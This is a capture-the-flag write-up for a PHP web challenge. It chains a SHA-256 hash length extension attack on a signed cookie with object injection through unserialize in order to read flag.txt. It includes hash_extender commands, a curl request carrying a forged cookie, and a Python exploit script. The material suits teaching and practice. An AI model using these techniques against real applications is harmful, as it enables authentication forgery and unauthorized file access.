This is some difficult

First, the auth code is vulnerable to a length extension attack. Also, passing user input to unserialize is dangerous.

Begin by creation `test.php` with the following contents:

```php
<?php
include("config.php");
include("classes.php");
$f = new File("flag.txt");
echo serialize($f);
```

Take that, and reverse it, and use length extension to append that.

Next, use the guide here: [https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack?utm_source=rss&utm_medium=rss&utm_campaign=plaidctf-web-150-mtpox-hash-extension-attack](here), to exploit the length extension. 

```
./hash_extender --data ';0:b' -s 25379ccdaefc067c701659406dad068fe5dacefa53a45a9fdf402b8942c247c2 --append '};"txt.galf":8:s;"emanelif":8:s{:1:"eliF":4:O' --secret-min=32 --secret-max=32 --out-data-format=html

curl -b "auth=O%3a4%3a%22File%22%3a1%3a%7bs%3a8%3a%22filename%22%3bs%3a8%3a%22flag%2etxt%22%3b%7d+%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; sig=76eefb902017f810c3c1afd05952f507017b9c58a1b6406422dbb31df0188e9b" http://web2015.icec.tf/giga/files.php

./hash_extender --data ';0:b' -s 25379ccdaefc067c701659406dad068fe5dacefa53a45a9fdf402b8942c247c2 --append '};"txt.galf":8:s;"emanelif":8:s{:1:"eliF":4:O' --secret-min=32 --secret-max=32 --out-data-format=html
```

```
import hlextend
import requests
import subprocess

def php_urlencode(s):
    '''Return php urlencoded string'''
    print "ENCODE: " + s
    s = s.replace("\x00", "\0")
    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)

    with open('encode_me.php', 'w') as f:
        f.write(encode_php)

    output = subprocess.check_output('php encode_me.php', shell=True)
    return output

url = 'http://web2015.icec.tf/giga/files.php'
original_hash = '25379ccdaefc067c701659406dad068fe5dacefa53a45a9fdf402b8942c247c2'
original_data = ';0:b'
appended_data = "".join(reversed('O:4:"File":1:{s:8:"filename";s:8:"flag.txt";}'))
key_length = 32

# Get our new hash for our new data
sha = hlextend.new('sha256')
cookie = sha.extend(appended_data, original_data, key_length, original_hash, raw=True)
cookie_hash = sha.hexdigest()
cookie = "".join(reversed(cookie))

# Send a request with our new cookie to verify our method works
output = php_urlencode(cookie)
cookies = {'sig': cookie_hash,
           'auth': output}
print requests.get(url, cookies=cookies).text
```


resources: https://github.com/bwall/HashPump
https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/mtpox
https://github.com/thebarbershopper/ctf-writeups/tree/master/pico-ctf-2014
https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack
https://github.com/stephenbradshaw/hlextend